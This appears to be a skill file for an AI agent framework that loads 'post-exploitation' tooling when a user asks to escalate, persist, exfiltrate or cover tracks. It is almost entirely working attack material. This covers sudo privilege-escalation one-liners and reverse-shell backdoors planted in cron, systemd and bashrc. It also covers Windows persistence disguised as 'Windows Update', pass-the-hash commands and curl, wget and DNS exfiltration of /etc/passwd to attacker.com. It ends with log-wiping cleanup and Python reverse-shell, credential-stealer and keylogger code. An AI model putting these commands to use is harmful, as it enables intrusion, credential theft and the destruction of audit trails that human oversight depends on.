---
name: post-tools
description: "Post-exploitation — persistence, privilege escalation, lateral movement, data exfiltration, cleanup."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [post, persist, privesc, exfil, lateral, cleanup]
    related_skills: [blackhat-mode, exploit-tools, stealth-tools, cred-tools]
prerequisites:
  commands: [python]
---

# Post-Exploitation Tools

## When to Load This Skill

User requests:
- "post exploit", "persist", "privesc", "escalate"
- "exfil", "lateral", "move", "pivot"
- "cleanup", "cover tracks"

---

## Privilege Escalation

### Linux

```bash
# System info
uname -a
cat /etc/os-release
id
whoami

# SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null

# Sudo permissions
sudo -l

# Capabilities
getcap -r / 2>/dev/null

# Kernel exploits
searchsploit linux kernel 4.x

# Writable paths
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Processes
ps aux | grep root
ps aux | grep mysql

# Network
netstat -tlnp
ss -tlnp

# Services
systemctl list-units --type=service
```

### Common Privesc

```bash
# SUID find
find / -perm -u=s -type f 2>/dev/null

# Sudo vim
sudo vim -c '!sh'

# Sudo find
sudo find / -exec sh -i \;

# Sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# Sudo perl
sudo perl -e 'exec "/bin/sh";'

# Sudo python
sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Sudo env
sudo env /bin/sh

# Sudo less
sudo less /etc/passwd
# Then type: !sh

# Sudo man
sudo man man
# Then type: !sh

# Sudo ftp
sudo ftp
# Then type: !sh

# Sudo nmap
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# Sudo php
sudo php -r 'pcntl_exec("/bin/sh", ["-p"]);'

# Capabilities
getcap -r / 2>/dev/null
# If python has cap_setuid:
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### Windows

```bash
# System info
systeminfo
whoami /all
net user
net localgroup administrators

# Services
sc query
wmic service list brief

# Tasks
schtasks /query /fo LIST /v

# Registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# DLL hijacking
where /R C:\ *.dll 2>nul

# Token impersonation
whoami /priv
```

### Windows Privesc

```bash
# JuicyPotato
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *

# PrintSpoofer
PrintSpoofer.exe -i -c cmd

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato
SweetPotato.exe -p C:\Windows\System32\cmd.exe

# RottenPotato
rottenpotato.exe
# Then impersonate with incognito in Meterpreter
```

---

## Persistence

### Linux

```bash
# Crontab
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" | crontab -

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
systemctl start backdoor.service

# SSH key
mkdir -p ~/.ssh
echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Bashrc
echo "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &'" >> ~/.bashrc

# Profile
echo "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &'" >> /etc/profile

# Init.d
cat > /etc/init.d/backdoor << EOF
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &'
EOF
chmod +x /etc/init.d/backdoor
```

### Windows

```bash
# Registry Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# Scheduled task
schtasks /create /tn "Windows Update" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM

# Service
sc create "Windows Update" binPath= "C:\Windows\Temp\backdoor.exe" start= auto

# Startup folder
copy backdoor.exe "C:\Users\Public\Start Menu\Programs\Startup\"

# WMI
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="filter",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
```

---

## Lateral Movement

### Credential Reuse

```bash
# Pass the hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
psexec.py DOMAIN/user:password@TARGET

# Pass the ticket
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass DOMAIN/user@TARGET

# Overpass the hash
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass DOMAIN/user@TARGET
```

### Network Pivoting

```bash
# SSH tunnel
ssh -L 8080:TARGET:80 USER@JUMP
ssh -D 1080 USER@JUMP

# SSH dynamic
ssh -D 0.0.0.0:1080 USER@JUMP

# Port forward
ssh -L 3306:DATABASE:3306 USER@JUMP

# Chisel
# Server
chisel server --reverse --port 8080
# Client
chisel client ATTACKER:8080 R:socks
```

---

## Data Exfiltration

### DNS Exfil

```bash
# Encode data as DNS queries
cat /etc/passwd | base64 | sed 's/./&./g' | while read line; do
  ping -c 1 $line.attacker.com
done

# dnscat2
dnscat2-server attacker.com
dnscat2 ATTACKER
```

### HTTP Exfil

```bash
# Curl
curl -X POST http://attacker.com/exfil -d @/etc/passwd

# Wget
wget --post-file=/etc/passwd http://attacker.com/exfil

# Python
python -c "import requests; requests.post('http://attacker.com/exfil', data=open('/etc/passwd').read())"
```

### Encrypted Exfil

```bash
# GPG
gpg -c file.txt
curl -X POST http://attacker.com/exfil -F "file=@file.txt.gpg"

# OpenSSL
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
curl -X POST http://attacker.com/exfil -F "file=@file.enc"
```

---

## Cleanup

### Linux

```bash
# Clear logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# Clear history
history -c
history -w
rm ~/.bash_history

# Remove artifacts
rm -rf /tmp/backdoor*
rm -rf /var/tmp/*

# Clear timestamps
touch -r /bin/ls /tmp/clean
rm /tmp/clean
```

### Windows

```bash
# Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear DNS cache
ipconfig /flushdns

# Clear prefetch
del C:\Windows\Prefetch\*

# Clear temp
del /q/f/s C:\Windows\Temp\*
```

---

## Python Post-Exploit Tools

### Reverse Shell

```python
import socket, subprocess, os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
```

### File Stealer

```python
import os, requests, glob

def steal_files():
    paths = [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.ssh/authorized_keys"),
        os.path.expanduser("~/.bash_history"),
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.config/gcloud/credentials.db"),
    ]
    
    for path in paths:
        if os.path.exists(path):
            with open(path, 'r') as f:
                requests.post('http://attacker.com/exfil', data=f.read())
```

### Keylogger

```python
from pynput import keyboard

def on_press(key):
    with open('keylog.txt', 'a') as f:
        f.write(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Permission denied | Need root | Try privesc |
| Command not found | Missing tool | Install or use alternative |
| Connection refused | Target unreachable | Check network |
| Authentication failed | Wrong credentials | Try credential dump |
| Access denied | Insufficient privileges | Try impersonation |
